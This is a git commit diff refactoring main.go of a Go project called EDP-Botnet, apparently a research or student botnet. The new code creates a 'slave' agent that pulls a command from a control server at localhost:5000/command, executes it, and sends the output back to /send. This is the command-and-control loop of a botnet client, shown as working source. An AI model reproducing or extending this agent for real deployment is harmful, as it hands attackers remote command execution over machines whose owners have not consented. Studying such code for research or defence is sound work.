bf35ca513786119f498f878022ed9780797428de
Leonardo Ventura <leonardo.venturacl@gmail.com>
2020-07-06 19:17:41 -0300

    Refactor main to reflect changes on Slave

--- main.go
+++ main.go
@@ -1,13 +1,19 @@
 package main
 
-import(
-  "github.com/grisufrj/EDP-Botnet/ExecutingSlave"
+import (
+	"log"
+	"os"
+
+	slave "github.com/grisufrj/EDP-Botnet/ExecutingSlave"
 )
 
-func main(){
-  url := "http://localhost:5000"
-  comando := ExecutingSlave.Recv_cmd(url+"/command")
-  resp := ExecutingSlave.Exec_cmd(comando)
-  ExecutingSlave.Send_cmd(url+"/send",resp)
+func main() {
+	l := log.New(os.Stdout, "slave-logger", log.LstdFlags)
+	s := slave.NewSlave(l)
+	url := "http://localhost:5000"
+	comando := s.RecvCmd(url + "/command")
+	resp := s.ExecCmd(comando)
+	respStatus := s.SendCmd(url+"/send", resp)
 
+	log.Println(respStatus)
 }
